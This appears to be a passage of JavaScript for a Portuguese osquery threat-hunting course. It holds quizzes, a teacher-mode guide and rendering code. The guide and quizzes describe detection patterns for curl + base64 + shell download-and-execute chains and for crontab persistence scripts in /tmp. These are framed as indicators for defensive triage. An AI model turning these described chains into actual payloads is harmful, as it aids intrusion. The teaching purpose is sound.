Decisão boa nasce da correlação.", "Não. Isso é indisponibilidade fantasiada de resposta.", "Não. Nome não é absolvição.", "Não. Vazamento exige evidência adicional."]}, {"q": "Nível 4 — Qual campo melhora mais a triagem junto do remote_address?", "choices": ["path do processo associado.", "cor do terminal usado no lab.", "nome da aba do navegador.", "fase da lua na floresta digital."], "a": 0, "fb": ["Exato. Path ajuda a diferenciar processo legítimo de abuso.", "Não. Terminal bonito não é evidência.", "Não. Aba não explica conexão.", "kkkk não, apesar da lua estar linda."]}, {"q": "Nível 5 — Como transformar esse resultado em evento útil de SIEM?", "choices": ["Enviar processo, path, destino, porta e motivo da suspeita.", "Enviar somente IP remoto para reduzir volume de dados.", "Enviar tudo sem normalização, hipótese ou campo de contexto.", "Enviar apenas o nome wolf e aguardar o analista adivinhar."], "a": 0, "fb": ["Perfeito. Evento útil reduz tempo de triagem.", "Não. IP sozinho vira caça ao tesouro.", "Não. Bagunça no SIEM só terceiriza sofrimento.", "Não. Nome sem contexto é quase piada interna."]}], "5": [{"q": "Nível 1 — O lab em crontab procura qual tipo de evidência?", "choices": ["Persistência por tarefa agendada.", "Tráfego de rede em tempo real.", "Hash de arquivo alterado.", "Inventário de CPU do host."], "a": 0, "fb": ["Certo. Crontab é ponto clássico de persistência.", "Não. Rede está em sockets.", "Não. Hash está na tabela hash.", "Não. CPU está em system_info."]}, {"q": "Nível 2 — O que torna uma entrada de crontab suspeita?", "choices": ["Comando recorrente chamando script em caminho incomum.", "Qualquer tarefa agendada existente em servidor Linux.", "Toda tarefa executada em horário comercial.", "A presença de minuto e hora na saída da tabela."], "a": 0, "fb": ["Exato. Recorrência + caminho estranho merece atenção.", "Não. Crontab é normal em Linux.", "Não. Horário comercial não condena nada sozinho.", "Não. Minuto e hora são estrutura da tabela."]}, {"q": "Nível 3 — Se crontab chama /tmp/.wolf/persist.sh, o que fazer?", "choices": ["Correlacionar com processo em /tmp, hash e conexão externa.", "Apagar a linha e fechar chamado sem registrar evidência.", "Reiniciar o host e torcer para o lobo esquecer o caminho.", "Ignorar porque persistência só existe em Windows."], "a": 0, "fb": ["Perfeito. Persistência fica forte quando cruza com execução.", "Não. Isso destrói evidência e pode deixar cadeia ativa.", "Não. Torcida não é controle de segurança.", "Não. Persistência existe em todo sistema felizmente para atacantes."]}, {"q": "Nível 4 — Qual conclusão o crontab sozinho NÃO permite?", "choices": ["Que existe tarefa recorrente a investigar.", "Que há comando configurado para execução periódica.", "Que ocorreu exfiltração de dados sensíveis.", "Que o caminho do script precisa ser validado."], "a": 2, "fb": ["Permite sim identificar tarefa a investigar.", "Permite sim observar execução periódica.", "Exato. Exfiltração exige evidência de dados e tráfego.", "Permite sim levantar validação do path."]}, {"q": "Nível 5 — Qual relatório é mais defensável?", "choices": ["Crontab suspeito foi identificado e correlacionado com execução anômala.", "Servidor está comprometido apenas porque usa agendamento periódico.", "A persistência foi removida sem preservar qualquer detalhe técnico.", "Não existe risco porque tarefas agendadas são sempre administrativas."], "a": 0, "fb": ["Exato. Correlação dá sustentação técnica.", "Não. Agendamento por si só é normal.", "Não. Sem preservação, você perde rastreabilidade.", "Não. Tarefa administrativa também pode ser abusada."]}], "6": [{"q": "Nível 1 — Para que serve consultar hash no lab?", "choices": ["Identificar conteúdo do arquivo para comparação técnica.", "Descobrir automaticamente quem criou o arquivo.", "Bloquear a execução do binário no sistema.", "Medir consumo de memória do processo wolf."], "a": 0, "fb": ["Certo. Hash identifica conteúdo.", "Não. Hash não atribui autoria.", "Não. Essa consulta não bloqueia nada.", "Não. Memória é outra telemetria."]}, {"q": "Nível 2 — O que um sha256 ajuda a fazer?", "choices": ["Comparar arquivo com IOC, baseline ou amostra conhecida.", "Provar intenção maliciosa sem qualquer contexto adicional.", "Substituir análise de processo, rede e persistência.", "Descobrir a senha usada pelo atacante no endpoint."], "a": 0, "fb": ["Exato. Hash é comparação e rastreabilidade.", "Não. Hash não lê mente de arquivo.", "Não. Ele complementa a cadeia.", "Não. Hash não revela senha."]}, {"q": "Nível 3 — Se o hash é desconhecido, qual postura é melhor?", "choices": ["Tratar como ponto de investigação e correlacionar com comportamento.", "Concluir malware automaticamente e encerrar a análise.", "Ignorar porque apenas hashes conhecidos importam.", "Apagar o arquivo antes de preservar evidência."], "a": 0, "fb": ["Perfeito. Desconhecido exige análise, não chute.", "Não. Desconhecido não é sinônimo de malicioso.", "Não. Ameaça nova pode não estar em base conhecida.", "Não. Preservação vem antes do machado."]}, {"q": "Nível 4 — Quando o hash fica mais forte como evidência?", "choices": ["Quando associado a path, processo, rede e persistência.", "Quando aparece sozinho sem nenhum outro dado técnico.", "Quando o nome do arquivo parece assustador o bastante.", "Quando o analista não consegue explicar a query."], "a": 0, "fb": ["Exato. Evidência cruzada sustenta decisão.", "Não. Isolado é frágil.", "Não. Nome assustador é estética, não prova.", "Não. Se não explica, não deveria concluir."]}, {"q": "Nível 5 — Qual uso é mais profissional no relatório?", "choices": ["Registrar hash, caminho, query e relação com os demais achados.", "Colar o hash sem explicar por que ele importa no caso.", "Declarar comprometimento só porque o sha256 é longo e feio.", "Omitir hash para evitar confundir a equipe de resposta."], "a": 0, "fb": ["Perfeito. Hash precisa contexto e rastreabilidade.", "Não. Hash solto é decoração forense.", "Não. Comprimento não é severidade.", "Não. Omitir evidência enfraquece resposta."]}], "7": [{"q": "Nível 1 — O lab em services mostra o quê?", "choices": ["Serviços, status e caminhos configurados no host.", "Usuários conectados a destinos externos.", "Hash de todos os arquivos do sistema.", "Pacotes HTTP capturados em tempo real."], "a": 0, "fb": ["Certo. Services lista componentes persistentes do sistema.", "Não. Isso exigiria outra fonte.", "Não. Hash é outra tabela.", "Não. osquery não está fazendo packet capture aqui."]}, {"q": "Nível 2 — Por que path do serviço importa?", "choices": ["Porque revela de onde o serviço executa.", "Porque sempre indica quem criou o serviço.", "Porque substitui análise de cmdline.", "Porque elimina necessidade de baseline."], "a": 0, "fb": ["Exato. Caminho costuma entregar anomalia.", "Não. Origem/autoria exige mais contexto.", "Não. Cmdline continua útil.", "Não. Baseline ainda manda lembranças."]}, {"q": "Nível 3 — Serviço com nome normal e path estranho sugere o quê?", "choices": ["Possível camuflagem que precisa validação.", "Comprovação automática de atividade benigna.", "Erro impossível, pois nomes normais não enganam.", "Necessidade de ignorar o alerta para reduzir ruído."], "a": 0, "fb": ["Perfeito. Nome normal pode ser fantasia de lobo.", "Não. Normal no nome não absolve path estranho.", "Não. Atacante também sabe escolher nomes.", "Não. Ignorar sem validar é maturidade negativa."]}, {"q": "Nível 4 — Qual correlação melhora análise de serviços?", "choices": ["Comparar serviço com processo, path e persistência observada.", "Comparar cor do card com severidade do incidente.", "Comparar hostname com fase da lua do cenário.", "Comparar quantidade de módulos concluídos pelo aluno."], "a": 0, "fb": ["Exato. Serviço precisa conversa com outras evidências.", "Não. Visual não é telemetria.", "Não, embora a lua esteja dramática.", "Não. Progresso do curso não prova incidente."]}, {"q": "Nível 5 — Qual decisão é mais madura?", "choices": ["Validar dono, origem, mudança recente e relação com os achados.", "Desabilitar todos os serviços desconhecidos imediatamente.", "Concluir normalidade apenas porque o serviço está ativo.", "Encerrar o caso se o serviço tiver nome corporativo."], "a": 0, "fb": ["Perfeito. Serviço suspeito precisa validação operacional.", "Não. Isso pode derrubar produção.", "Não. Ativo não significa legítimo.", "Não. Nome corporativo é camuflagem comum."]}], "8": [{"q": "Nível 1 — O comando .tables ajuda em quê?", "choices": ["Descobrir quais tabelas estão disponíveis para consulta.", "Executar contenção automática no endpoint.", "Criar persistência para o osqueryd.", "Enviar eventos diretamente para o SIEM."], "a": 0, "fb": ["Certo. .tables é descoberta de superfície.", "Não. Ele não contém nada.", "Não. Não cria persistência.", "Não. Não é logger de SIEM."]}, {"q": "Nível 2 — Por que não colocar tudo em um pack?", "choices": ["Porque gera ruído, custo e baixa utilidade operacional.", "Porque packs só aceitam uma única tabela por vez.", "Porque osquery não suporta execução agendada.", "Porque inventário e hunting são sempre idênticos."], "a": 0, "fb": ["Exato. Pack sem critério vira lixeira premium.", "Não. Packs podem conter várias queries.", "Não. osqueryd suporta agendamento.", "Não. Objetivos diferentes pedem desenho diferente."]}, {"q": "Nível 3 — Um bom pack começa por qual decisão?", "choices": ["Objetivo da coleta e hipótese que a query apoia.", "Quantidade máxima de tabelas para impressionar auditor.", "Nome mais bonito para aparecer no dashboard.", "Uso de SELECT * em todas as tabelas disponíveis."], "a": 0, "fb": ["Perfeito. Objetivo vem antes da query.", "Não. Auditor sério quer evidência, não volume.", "Não. Nome bonito não salva pack ruim.", "Não. SELECT * em produção é pedido de terapia."]}, {"q": "Nível 4 — Como separar inventário e hunting?", "choices": ["Inventário coleta estado esperado; hunting procura comportamento suspeito.", "Inventário é sempre malicioso; hunting é sempre administrativo.", "Inventário usa rede; hunting usa apenas dados de CPU.", "Inventário só funciona em Windows; hunting só funciona em Linux."], "a": 0, "fb": ["Exato. Objetivo define frequência e interpretação.", "Não. Isso inverte tudo.", "Não. Ambos podem usar várias fontes.", "Não. osquery é multiplataforma."]}, {"q": "Nível 5 — Qual melhoria operacional um pack bem feito traz?", "choices": ["Consistência de coleta, manutenção simples e interpretação repetível.", "Mais ruído para o SOC demonstrar que está trabalhando muito.", "Eliminação total da necessidade de investigação humana.", "Garantia de que nenhum atacante conseguirá persistir no host."], "a": 0, "fb": ["Perfeito. Operação boa é repetível e explicável.", "Não. Volume sem valor é vaidade cara.", "Não. Analista continua necessário.", "Não. Nenhuma query garante invulnerabilidade."]}], "9": [{"q": "Nível 1 — Para SIEM, qual dado do lab é mais útil?", "choices": ["Processo, path, destino remoto, porta e motivo da suspeita.", "Somente o IP remoto, sem processo para reduzir complexidade.", "Apenas o nome wolf, porque é visualmente chamativo.", "Todos os dados sem normalização ou hipótese investigativa."], "a": 0, "fb": ["Certo. Contexto acelera triagem.", "Não. IP solto é sofrimento em formato de evento.", "Não. Nome sem contexto é quase meme.", "Não. Dado bruto sem hipótese vira ruído."]}, {"q": "Nível 2 — O que transforma telemetria em alerta útil?", "choices": ["Contexto, hipótese, severidade e campos acionáveis.", "Quantidade máxima de linhas retornadas pela query.", "Uso obrigatório de nomes assustadores no processo.", "Ausência de qualquer filtro para não perder nada."], "a": 0, "fb": ["Exato. Alerta útil ajuda decisão.", "Não. Linha demais pode virar ruído.", "Não. Nome assustador não é critério.", "Não. Sem filtro, o SIEM vira aterro sanitário."]}, {"q": "Nível 3 — Como evitar que osquery vire ruído no SIEM?", "choices": ["Enviar consultas com objetivo, frequência e interpretação definidos.", "Enviar todas as tabelas a cada minuto para garantir maturidade.", "Mandar apenas eventos bonitos e ignorar contexto técnico.", "Evitar documentação para manter flexibilidade operacional."], "a": 0, "fb": ["Perfeito. Coleta precisa intenção.", "Não. Isso é ataque de custo contra você mesmo.", "Não. Beleza não triage incidente.", "Não. Sem documentação ninguém sustenta decisão."]}, {"q": "Nível 4 — Qual evento seria ruim para N1?", "choices": ["remote_address isolado sem processo, host ou motivo da detecção.", "processo, path, destino, porta e query que gerou o achado.", "hash, path e relação com persistência observada no endpoint.", "cmdline suspeita com host, horário e hipótese documentada."], "a": 0, "fb": ["Exato. IP solto joga o N1 no mato escuro.", "Esse é bom, não ruim.", "Esse é bom para investigação.", "Esse é bom para triagem."]}, {"q": "Nível 5 — Qual frase resume a integração correta?", "choices": ["SIEM deve receber evidência contextual, não despejo de tabela.", "SIEM funciona melhor quando recebe qualquer dado sem filtro.", "osquery elimina a necessidade de playbook de resposta.", "Evento bom é aquele que ninguém precisa interpretar."], "a": 0, "fb": ["Perfeito. Contexto é o que torna telemetria acionável.", "Não. Sem filtro, o SIEM vira fábrica de alerta inútil.", "Não. Playbook continua necessário.", "Não. Evento bom facilita interpretação; não elimina raciocínio."]}], "10": [{"q": "Nível 1 — O lab procura base64 e curl. Por quê?", "choices": ["Porque essa combinação pode indicar download e execução de payload.", "Porque base64 sempre é malware e curl nunca é administrativo.", "Porque curl mostra automaticamente o conteúdo completo baixado.", "Porque base64 revela o usuário que iniciou a sessão remota."], "a": 0, "fb": ["Certo. O conjunto é mais importante que cada termo isolado.", "Não. Ambos podem ser legítimos; contexto decide.", "Não. A query mostra cmdline, não baixa conteúdo.", "Não. base64 não identifica usuário."]}, {"q": "Nível 2 — O que torna curl + base64 + sh preocupante?", "choices": ["Cadeia de buscar, decodificar e executar conteúdo remoto.", "Uso de ferramenta conhecida, o que sempre é proibido.", "Presença de letras minúsculas na linha de comando.", "Execução em qualquer servidor Linux, mesmo sem rede."], "a": 0, "fb": ["Perfeito. Essa sequência parece pipeline de payload.", "Não. Ferramenta legítima pode ser abusada, não proibida sempre.", "kkkk não. Caixa baixa não é IOC.", "Não. O contexto de rede e execução importa."]}, {"q": "Nível 3 — Qual próximo passo após encontrar essa cmdline?", "choices": ["Correlacionar processo, destino remoto, hash e persistência.", "Reiniciar o host para apagar o histórico do terminal.", "Ignorar porque administradores também usam curl.", "Bloquear base64 globalmente em todos os servidores."], "a": 0, "fb": ["Exato. Correlação separa administração feia de ataque.", "Não. Reiniciar pode perder evidência.", "Não. Uso legítimo não absolve cadeia suspeita.", "Não. Bloqueio global sem análise vira caos."]}, {"q": "Nível 4 — Qual conclusão é exagerada só com esse lab?", "choices": ["Existe comportamento suspeito que exige investigação imediata.", "Há indício de comando potencialmente abusivo na cmdline.", "O host sofreu exfiltração comprovada de dados sensíveis.", "A query encontrou padrão compatível com execução remota."], "a": 2, "fb": ["Isso é conclusão adequada, não exagerada.", "Isso é adequado.", "Exato. Exfiltração exige evidência própria.", "Isso é adequado ao resultado."]}, {"q": "Nível 5 — Como ensinar esse achado sem criar caça às bruxas?", "choices": ["Mostrar que ferramentas legítimas ficam suspeitas pela combinação e contexto.", "Dizer que qualquer uso de curl deve ser tratado como incidente crítico.", "Mandar apagar todo binário base64 para reduzir superfície de ataque.", "Declarar que cmdline não importa se o processo tem nome comum."], "a": 0, "fb": ["Perfeito. Contexto é o coração do hunting.", "Não. Isso vira falso positivo infinito.", "Não. Base64 é utilitário legítimo.", "Não. Nome comum pode esconder muita coisa."]}], "11": [{"q": "Nível 1 — O módulo de triagem começa por qual princípio?", "choices": ["Registrar evidência antes de decidir ação.", "Apagar artefato suspeito para reduzir risco.", "Confiar apenas no relato do usuário.", "Reiniciar host antes de coletar contexto."], "a": 0, "fb": ["Certo. Sem evidência, não há decisão defensável.", "Não. Apagar cedo destrói trilha.", "Não. Relato ajuda, mas não basta.", "Não. Reiniciar pode perder estado."]}, {"q": "Nível 2 — Qual evidência fortalece o processo em /tmp?", "choices": ["Conexão externa, persistência e hash relacionados.", "Cor do card do módulo e nome da personagem.", "Quantidade de abas abertas no navegador do analista.", "Ausência de qualquer evento em outras fontes."], "a": 0, "fb": ["Exato. Sinais convergentes elevam confiança.", "Não. Tema é divertido, mas não é evidência.", "Não. Isso só mede sofrimento.", "Não. Ausência de evento não fortalece por si só."]}, {"q": "Nível 3 — Qual decisão evita pânico operacional?", "choices": ["Escalar com evidência, hipótese, impacto provável e próximos passos.", "Declarar crise máxima sem validar escopo do incidente.", "Encerrar o chamado porque a máquina ainda responde ping.", "Pedir para o usuário desligar tudo sem registrar nada."], "a": 0, "fb": ["Perfeito. Escalação boa é clara e sustentada.", "Não. Pânico não é severidade.", "Não. Ping não inocenta endpoint.", "Não. Isso vira caos sem rastreabilidade."]}, {"q": "Nível 4 — O que diferencia triagem de chute?", "choices": ["Query executada, resultado interpretado e hipótese testável.", "Frase bonita no relatório sem evidência técnica.", "Confiança absoluta baseada em nome suspeito do processo.", "Pressa para fechar SLA antes de entender o caso."], "a": 0, "fb": ["Exato. Hipótese testável separa analista de vidente.", "Não. Texto bonito sem evidência é maquiagem.", "Não. Nome suspeito é pista.", "Não. SLA não pode matar investigação."]}, {"q": "Nível 5 — Qual frase é melhor para o relatório?", "choices": ["Foram observados sinais correlacionados de execução anômala e persistência.", "O lobo invadiu com certeza porque o nome do processo era wolf.", "Nada aconteceu porque o usuário não reclamou de indisponibilidade.", "A análise foi inconclusiva porque existem muitas tabelas disponíveis."], "a": 0, "fb": ["Perfeito. Técnica, cautela e evidência no mesmo pacote.", "Não. Nome não é prova final.", "Não. Usuário calado não significa ambiente limpo.", "Não. Muitas tabelas não impedem conclusão estruturada."]}], "12": [{"q": "Nível 1 — O caso final combina quais sinais?", "choices": ["Processo suspeito, rede externa, persistência e hash.", "CPU alta, papel de parede vermelho e cursor bonito.", "Apenas hostname e quantidade de memória física.", "Somente uma conta root esperada em Linux."], "a": 0, "fb": ["Certo. Cadeia convergente sustenta o caso.", "kkkk não. Estética não é IOC.", "Não. Inventário sozinho não fecha caso.", "Não. Root esperado não é caso final."]}, {"q": "Nível 2 — Por que a conclusão final não deve vir de uma única query?", "choices": ["Porque evidência forte nasce da convergência entre fontes.", "Porque osquery não retorna nenhum dado útil para investigação.", "Porque toda query SQL é automaticamente inconclusiva.", "Porque o terminal verde não deve ser usado em incidentes."], "a": 0, "fb": ["Perfeito. Uma pista vira caso quando outras pistas confirmam.", "Não. O curso inteiro prova o contrário.", "Não. Query pode ser conclusiva dentro de contexto.", "Não. A cor do terminal não define maturidade."]}, {"q": "Nível 3 — Qual conclusão é mais defensável?", "choices": ["Compromisso provável do host, sustentado por evidência cruzada.", "Falso positivo confirmado porque wolf pode ser nome temático.", "Exfiltração comprovada, mesmo sem volume ou conteúdo analisado.", "Ambiente limpo, porque o servidor ainda respondeu às consultas."], "a": 0, "fb": ["Exato. Provável compromisso é conclusão proporcional à evidência.", "Não. Nome temático não anula cadeia técnica.", "Não. Exfiltração exige evidência específica.", "Não. Host comprometido também responde query."]}, {"q": "Nível 4 — Qual recomendação final é mais madura?", "choices": ["Conter de forma planejada, preservar evidência e ampliar escopo.", "Apagar /tmp inteiro para resolver rápido e liberar o chamado.", "Ignorar persistência até aparecer ransomware de verdade.", "Reiniciar tudo sem avisar operação para ganhar tempo."], "a": 0, "fb": ["Perfeito. Resposta madura controla dano e preserva rastreabilidade.", "Não. Isso pode quebrar sistema e destruir evidência.", "Não. Esperar ransomware é estratégia do lobo.", "Não. Operação precisa coordenação."]}, {"q": "Nível 5 — O que o aluno deveria ter aprendido ao final?", "choices": ["Transformar comandos osquery em raciocínio investigativo defensável.", "Decorar queries sem entender colunas, hipótese ou interpretação.", "Concluir incidente sempre que encontrar qualquer saída diferente.", "Usar o terminal apenas como enfeite para parecer SOC real."], "a": 0, "fb": ["Exatamente. O curso é sobre pensar com evidência, não só copiar query.", "Não. Decorar sem entender quebra no primeiro cenário real.", "Não. Diferença não é incidente automaticamente.", "Não. Terminal bonito sem raciocínio é cosplay de SOC."]}]};
+
+lessons.forEach(l=>{
+  l.questions = progressiveQuestions[l.id] || [];
+});
+
+function renderQuestions(l){
+  const labDone = lessonLabDone(l.id);
+  return l.questions.map((q,qi)=>`
+    <div class="quiz-box progressive-box">
+      <h3>Questão ${qi+1} · dificuldade ${qi+1}/5</h3>
+      <p>${esc(q.q)}</p>
+      ${!labDone?`<div class="quiz-locked">🐺 Execute o lab obrigatório antes de responder as questões deste módulo.</div>`:''}
+      ${q.choices.map((c,i)=>`
+        <button class="choice pq-${l.id}-${qi}" data-q="${qi}" data-ans="${i}" ${!labDone?'disabled style="opacity:.55;cursor:not-allowed"':''}>
+          ${String.fromCharCode(65+i)}. ${esc(c)}
+        </button>`).join('')}
+      <p class="small progressive-feedback" id="pf-${l.id}-${qi}"></p>
+    </div>
+  `).join('');
+}
+
+function answerProgressive(id,qidx,i,b){
+  const l=lessons.find(x=>x.id===id);
+  if(!lessonLabDone(id)){
+    toast('Sem executar o lab, responder quiz é igual investigar IOC pelo horóscopo.');
+    return;
+  }
+  st.pquiz = st.pquiz || {};
+  st.pquiz[id] = st.pquiz[id] || {};
+  const q = l.questions[qidx];
+  const right = q.a;
+  document.querySelectorAll('.pq-'+id+'-'+qidx).forEach(x=>x.classList.remove('correct','wrong'));
+  const fb = q.fb[i];
+  if(i===right){
+    b.classList.add('correct');
+    st.pquiz[id][qidx]=true;
+    document.getElementById('pf-'+id+'-'+qidx).textContent='✅ '+fb;
+  }else{
+    b.classList.add('wrong');
+    document.getElementById('pf-'+id+'-'+qidx).textContent='⚠️ '+fb;
+  }
+  save();
+}
+
+function progressiveDone(id){
+  const l=lessons.find(x=>x.id===id);
+  if(!l || !l.questions) return false;
+  const ans = (((st||{}).pquiz||{})[id]) || {};
+  return l.questions.every((_,idx)=>ans[idx]);
+}
+
+
+/* === MODO PROFESSOR: explicações dos comandos === */
+const commandGuides = {
+  "system_info":{
+    title:"Inventário inicial do endpoint",
+    what:"Consulta dados básicos do host, como hostname, CPU e memória. Isso cria contexto antes de qualquer hipótese de incidente.",
+    parts:["SELECT escolhe as colunas que serão exibidas.","FROM system_info consulta a tabela de informações do sistema.","hostname ajuda a identificar o ativo investigado.","physical_memory ajuda a entender capacidade e perfil do host."],
+    interpretation:"Se o resultado mostra vovo-srv-2009, você identificou o ativo. Isso não prova ataque; só evita investigar no escuro.",
+    mistake:"Erro comum: tratar inventário como detecção. Saber o nome do host não significa que o lobo invadiu."
+  },
+  "users":{
+    title:"Usuários locais e identidade",
+    what:"Lista contas locais. Serve para reconhecer contas humanas, técnicas, privilegiadas e possíveis usuários fora do padrão.",
+    parts:["username é o nome da conta.","uid indica identidade numérica no sistema.","uid=0 normalmente representa root em Linux.","directory mostra o diretório home associado."],
+    interpretation:"A tabela ajuda a montar baseline de identidade. Conta suspeita precisa de contexto: quando surgiu, quem usa e por quê.",
+    mistake:"Erro comum: achar que toda conta estranha é invasão. Em ambiente real, legado também parece crime."
+  },
+  "processes_tmp":{
+    title:"Hunting de processos em /tmp",
+    what:"Procura processos executando a partir de /tmp, um local temporário frequentemente abusado em ataques e scripts improvisados.",
+    parts:["pid identifica o processo.","name mostra o nome aparente.","path revela o caminho real do binário.","cmdline mostra como o processo foi executado."],
+    interpretation:"Processo em /tmp com cmdline estranha é forte sinal de investigação. Não é condenação automática, mas é prioridade.",
+    mistake:"Erro comum: concluir malware só por estar em /tmp. O mais importante é correlacionar path, cmdline, rede e persistência."
+  },
+  "processes_cmd":{
+    title:"Cmdline com curl, base64 ou shell",
+    what:"Busca comandos que indicam download, decodificação e execução. Essa combinação é muito usada em payloads e automações perigosas.",
+    parts:["cmdline revela argumentos completos.","curl pode baixar conteúdo remoto.","base64 pode esconder payload ou configuração.","sh/bash pode executar o conteúdo recebido."],
+    interpretation:"curl + base64 + shell merece investigação imediata, principalmente quando ligado a /tmp ou conexão externa.",
+    mistake:"Erro comum: bloquear tudo sem preservar evidência. Primeiro entenda cadeia, escopo e impacto."
+  },
+  "sockets_join":{
+    title:"Correlação entre processo e conexão de rede",
+    what:"Usa JOIN para ligar conexões de rede aos processos responsáveis. Isso transforma IP solto em evidência com contexto.",
+    parts:["process_open_sockets traz conexões abertas.","processes traz nome, path e cmdline.","JOIN cruza as tabelas pelo pid.","remote_address mostra o destino remoto."],
+    interpretation:"Se o processo suspeito em /tmp conversa com endereço externo, a hipótese ganha força. Rede sem processo é só metade da história.",
+    mistake:"Erro comum: olhar só IP remoto. Sem processo, path e cmdline, a triagem vira caça ao tesouro."
+  },
+  "crontab":{
+    title:"Persistência via crontab",
+    what:"Lista tarefas agendadas. Ajuda a descobrir mecanismos usados para voltar após reboot ou reexecução periódica.",
+    parts:["command mostra o que será executado.","minute e hour mostram a frequência.","*/5 indica execução recorrente a cada cinco minutos.","Comando em /tmp é sinal que merece validação."],
+    interpretation:"Crontab chamando script suspeito fortalece a hipótese de persistência. É mais forte quando cruza com processo e rede.",
+    mistake:"Erro comum: apagar a tarefa antes de documentar. Isso pode destruir evidência e não remover a causa."
+  },
+  "hash":{
+    title:"Hash e integridade de arquivo",
+    what:"Calcula hash de um arquivo para comparar com baseline, IOC ou registro anterior.",
+    parts:["path indica o arquivo analisado.","sha256 identifica o conteúdo do arquivo.","Hash igual sugere mesmo conteúdo.","Hash diferente indica alteração ou outro arquivo."],
+    interpretation:"Hash não prova intenção sozinho, mas ajuda a sustentar evidência e comparar com inteligência de ameaça.",
+    mistake:"Erro comum: achar que hash desconhecido é malware. Desconhecido significa investigar, não inventar veredito."
+  },
+  "services":{
+    title:"Serviços e baseline operacional",
+    what:"Lista serviços, status e caminhos. Ajuda a encontrar persistência formal ou componentes fora do padrão.",
+    parts:["name é o nome do serviço.","status mostra se está ativo.","path mostra onde o serviço executa.","Caminho incomum precisa de validação."],
+    interpretation:"Serviço estranho pode ser legítimo ou ameaça. O que decide é baseline, dono, mudança recente e correlação.",
+    mistake:"Erro comum: confiar no nome do serviço. Atacante também sabe criar nome corporativo bonitinho."
+  },
+  "tables":{
+    title:"Descoberta de tabelas disponíveis",
+    what:"Mostra quais tabelas o osquery consegue consultar no ambiente simulado.",
+    parts:[".tables não é SQL puro; é comando interativo do osqueryi.","Ajuda a descobrir superfícies de investigação.","Serve para aprender antes de escrever queries.","Também ajuda a planejar packs."],
+    interpretation:"Listar tabelas é etapa de exploração. A partir daí você escolhe consultas conforme a hipótese.",
+    mistake:"Erro comum: querer consultar tudo sempre. Em produção, isso vira ruído, custo e sofrimento."
+  },
+  "schema":{
+    title:"Entendendo colunas antes da query",
+    what:"Mostra as colunas de uma tabela. Ajuda a escrever consultas melhores e evitar chute.",
+    parts:[".schema nome_tabela mostra estrutura da tabela.","Colunas dizem que evidência pode ser extraída.","Ajuda a escolher SELECT com precisão.","Evita SELECT * sem objetivo."],
+    interpretation:"Antes de caçar, entenda o que a tabela oferece. Analista bom pergunta melhor.",
+    mistake:"Erro comum: decorar query sem entender coluna. Aí muda o cenário e a pessoa desmaia tecnicamente."
+  }
+};
+
+function guideKey(cmd){
+  const q=String(cmd||'').toLowerCase();
+  if(q.includes('.tables')) return 'tables';
+  if(q.includes('.schema')) return 'schema';
+  if(q.includes('from system_info')) return 'system_info';
+  if(q.includes('from users')) return 'users';
+  if(q.includes('from crontab')) return 'crontab';
+  if(q.includes('from hash')) return 'hash';
+  if(q.includes('from services')) return 'services';
+  if(q.includes('process_open_sockets') && q.includes('join')) return 'sockets_join';
+  if(q.includes('from processes') && (q.includes('base64') || q.includes('curl'))) return 'processes_cmd';
+  if(q.includes('from processes') && q.includes('/tmp')) return 'processes_tmp';
+  return null;
+}
+
+function guideHtml(cmd){
+  const k=guideKey(cmd);
+  if(!k) return '';
+  const g=commandGuides[k];
+  return `<div class="teacher-card">
+    <h4>📘 Modo professor — ${esc(g.title)}</h4>
+    <p><strong>O que este comando faz:</strong> ${esc(g.what)}</p>
+    <div class="teacher-grid">
+      <div class="teacher-pill"><strong>Quebrando o comando</strong><ul>${g.parts.map(x=>`<li>${esc(x)}</li>`).join('')}</ul></div>
+      <div class="teacher-pill"><strong>Como interpretar</strong><p>${esc(g.interpretation)}</p><strong>Erro comum</strong><p>${esc(g.mistake)}</p></div>
+    </div>
+  </div>`;
+}
+
+function terminalGuideHtml(cmd){
+  const k=guideKey(cmd);
+  if(!k) return '';
+  const g=commandGuides[k];
+  return `<div class="term-teacher"><b>Modo professor:</b> ${esc(g.what)}<br><b>Interpretação:</b> ${esc(g.interpretation)}<br><b>Cuidado:</b> ${esc(g.mistake)}</div>`;
+}
+
+function renderModules(){const box=$('#modulesGrid');box.innerHTML='';lessons.forEach(l=>{const locked=l.id>1&&!st.done?.[l.id-1];const done=!!st.done?.[l.id];const div=document.createElement('div');div.className='module-card '+(locked?'locked ':'')+(done?'done ':'');div.innerHTML=`<span class="module-num">MÓDULO ${String(l.id).padStart(2,'0')} · ${l.tag}</span><span class="module-title">${l.id===12?'🏹':'🐺'} ${esc(l.t)}</span><span class="module-desc">${esc(l.desc)}</span><div class="module-meta"><span>${done?'✅ Concluído':locked?'🔒 Bloqueado':'Disponível'}</span><span>Lab + Quiz</span></div>${locked?'<span class="lock">🔒</span>':''}`;div.onclick=()=>{if(!requireName())return;if(locked){toast('A floresta é sequencial. Termine o módulo anterior antes de pular para o trauma avançado.');return}activeLesson=l.id;showLesson(l.id);switchTab('aula')};box.appendChild(div)});}
+function renderLessonNav(){const nav=$('#lessonNav');nav.innerHTML='';lessons.forEach(l=>{const locked=l.id>1&&!st.done?.[l.id-1];const b=document.createElement('button');b.className='lesson-btn '+(activeLesson===l.id?'active ':'')+(locked?'locked ':'')+(st.done?.[l.id]?'done ':'');b.innerHTML=`${String(l.id).padStart(2,'0')} · ${esc(l.t)}<br><span class="small">${locked?'🔒 Bloqueado':st.done?.[l.id]?'✅ Concluído':l.tag}</span>`;b.onclick=()=>{if(!requireName())return;if(locked){toast('Termine a etapa anterior. Até o lobo respeita sequência de ataque.');return}showLesson(l.id)};nav.appendChild(b)})}
+function showLesson(id){
+  activeLesson=id;
+  const l=lessons.find(x=>x.id===id);
+  const labDone=lessonLabDone(id);
+  $('#lessonPanel').innerHTML=`<h2>${String(l.id).padStart(2,'0')} · ${esc(l.t)}</h2>
+  <p>${esc(l.desc)}</p>
+  <div class="two"><div><h3>Teoria técnica</h3>${l.theory.map(x=>`<p>${esc(x)}</p>`).join('')}</div>
+  <div><h3>Notas do Caçador</h3><p>${esc(l.acid||"O Caçador observou o cenário, respirou fundo e decidiu documentar antes de surtar. Milagre raro em SOC.")}</p><div class="callout">${esc(l.practice)}</div></div></div>
+  <h3>Comandos práticos</h3>
+  ${l.cmds.map(c=>`<div class="code-block">${esc(c)}</div><button class="mini-btn" data-cmd="${esc(c)}">Executar no terminal</button>${guideHtml(c)}`).join('')}
+  <div class="lab-status" id="labStatus">${labDone?'✅ Lab executado. Agora responda com base no resultado do terminal.':'🔒 Execute o lab obrigatório no terminal antes de responder e concluir.'}</div>
+  ${renderQuestions(l)}<div class="quiz-box"><h3>Questão final do módulo</h3><p>${esc(l.quiz)}</p>
